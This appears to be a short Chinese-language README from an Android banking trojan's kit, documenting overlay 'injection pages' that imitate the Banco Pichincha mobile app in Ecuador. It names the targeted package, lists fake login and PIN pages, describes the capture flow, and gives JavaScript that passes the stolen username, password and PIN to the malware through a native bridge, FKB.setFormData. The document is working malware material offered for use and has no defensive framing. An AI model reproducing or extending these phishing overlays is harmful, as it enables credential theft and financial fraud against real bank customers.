# 厄瓜多尔（EC）注入页

| 品牌 | 包名 | 文件 |
|---|---|---|
| Banca móvil（Banco Pichincha） | com.yellowpepper.pichincha | `com.yellowpepper.pichincha.html`（登录） + `pichincha_pin.html`（PIN） |

## 流程

```
登录页输入 用户名/密码 → 提交（FKB.setFormData）
  → 自动跳转 pichincha_pin.html → 输入 PIN → 提交
```

## 协议

只走 APK 原生桥，页面内无任何 HTTP 外发：

```js
// 登录
FKB.setFormData(JSON.stringify({
  pkg: pk, sn: sn, template: 'pichincha',
  formData: { username: u, password: p }
}));

// PIN
FKB.setFormData(JSON.stringify({
  pkg: pk, sn: sn, template: 'pichincha',
  formData: { pin: pin }
}));
```
